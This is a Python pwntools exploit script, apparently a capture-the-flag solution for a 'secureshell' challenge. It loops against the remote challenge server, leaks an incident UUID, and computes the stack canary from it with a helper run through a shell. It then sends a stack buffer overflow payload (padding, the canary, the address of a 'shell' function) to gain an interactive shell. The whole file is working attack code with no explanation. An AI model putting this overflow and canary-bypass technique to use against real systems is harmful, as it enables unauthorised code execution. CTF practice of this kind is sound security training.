from pwn import *
import time
import subprocess

target = ELF('./secureshell')

while True:
	# r = process('./secureshell', env={'SECUREPASSWORD': 'hoge'})
	r = remote('secureshell.wpictf.xyz', 31337)

	try:
		r.sendlineafter('Enter the password\n', 'piyo')

		r.recvuntil('Incident UUID: ')
		uuid = r.recvline().strip()
		assert(len(uuid) == 32)

		digest = uuid[:16].decode('hex')[::-1] + uuid[16:].decode('hex')[::-1]

		command = "./calc_canary {} '{}'".format(int(time.time()) - 1, digest)
		canary = int(subprocess.check_output(command, shell=True), 16)

		payload = ''
		payload += 'A' * 0x70
		payload += p64(canary)
		payload += 'A' * 8
		payload += p64(target.symbols['shell'])

		r.sendlineafter('Enter the password\n', payload)
	except:
		r.close()
		continue

	r.interactive()

	break
